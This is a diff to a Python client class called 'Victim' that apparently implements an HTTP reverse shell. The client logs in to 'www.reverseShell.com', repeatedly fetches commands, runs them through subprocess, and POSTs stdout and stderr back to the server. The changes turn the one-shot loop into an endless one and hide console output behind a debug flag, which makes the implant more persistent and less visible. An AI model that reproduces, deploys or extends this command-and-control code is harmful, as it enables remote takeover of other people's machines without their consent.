@@ -5,6 +5,7 @@ import time
 import subprocess
 
 class Victim:
+    DEBUG = True
 
     # Try to load session cookies from file
     def __tryToLoadSessionCookies(self):
@@ -55,7 +56,7 @@ class Victim:
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE )
-        return str(output.stdout.read(), 'utf-8')
+        return str(output.stdout.read(), 'utf-8') + str(output.stderr.read(), 'utf-8')
 
     def sendCommandOutput(self, output):
         return self.__session.request('POST',
@@ -67,56 +68,60 @@ class Victim:
 
 
 
+# Print message if debug flag is set
+def printDebug(message, end='\n'):
+    if(Victim.DEBUG):
+        print(message, end=end)
+
 # Print response object
-def printResponse(response):
-    print(response.text, end='')
+#def printResponse(response):
+    #print(response.text, end='')
 
 def main():
     # Module for connection debugging
     logging.basicConfig(level=logging.DEBUG)
-
     # Server domain
     baseUrl = 'http://www.reverseShell.com'
-
     # Variable to store command
     data = {'cmd': None, 'output': None}
 
     # Login
     victim = Victim()
-    print('Requesting login...')
-    printResponse(victim.connectToServer(baseUrl))
+    printDebug('Requesting login...')
+    printDebug(victim.connectToServer(baseUrl).text)
 
-    running = True
+    #running = True
     try:
-        #while True:
-        while running:
+        while True:
+        #while running:
             # Ask for command to server
-            print('Asking for command...')
+            printDebug('Asking for command...')
             data['cmd'] = victim.askForCommand().text
-            print('Command received: ', data['cmd'])
+            printDebug(data['cmd'])
 
             # Execute command
-            print('Executing...')
+            printDebug('Executing...')
             data['output'] = victim.executeCommand(data['cmd'])
-            print(data['output'], end='')
+            printDebug(data['output'], end='')
 
             # Send output to server
+            printDebug('Sending output...')
+            printDebug(victim.sendCommandOutput(data['output']).text, end='')
+            #print('Output sent')
 
 
             #time.sleep(1)
-            running = False
+            #running = False
     # If hit Ctrl+c
     except KeyboardInterrupt:
         raise SystemExit
     finally:
-        printResponse(victim.disconnectFromServer())
+        printDebug(victim.disconnectFromServer())
 
     #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))
     #print(s.cookies.get_dict())
     #print(response.content)
     #print(response.text)
-
-    exit()
 
     '''
         while True:
